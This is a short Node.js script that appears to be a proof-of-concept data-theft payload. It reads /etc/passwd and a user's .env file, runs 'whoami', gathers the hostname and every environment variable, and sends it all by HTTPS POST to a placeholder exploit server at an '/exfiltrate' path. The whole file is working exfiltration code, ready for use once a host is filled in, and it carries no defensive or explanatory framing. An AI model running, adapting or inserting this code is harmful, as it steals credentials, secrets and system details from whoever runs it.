const { exec } = require('child_process');
const https = require('https');
const os = require('os');
const fs = require('fs');


const sensitiveFiles = ['/etc/passwd', '/home/user/.env']; 
let fileContents = {};
sensitiveFiles.forEach(path => {
  try {
    fileContents[path] = fs.readFileSync(path, 'utf8');
  } catch (e) {
    fileContents[path] = 'Could not read file';
  }
});

// Execute arbitrary command
exec('whoami', (err, stdout) => {
  const data = JSON.stringify({
    hostname: os.hostname(),
    envVars: process.env,
    files: fileContents,
    commandOutput: stdout.trim()
  });

  const options = {
    hostname: 'LINK-TO-EXPLOIT-SERVER-TO-RECEIVE-REQUESTS',
    port: 443,
    path: '/exfiltrate',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };

  const req = https.request(options);
  req.write(data);
  req.end();
});
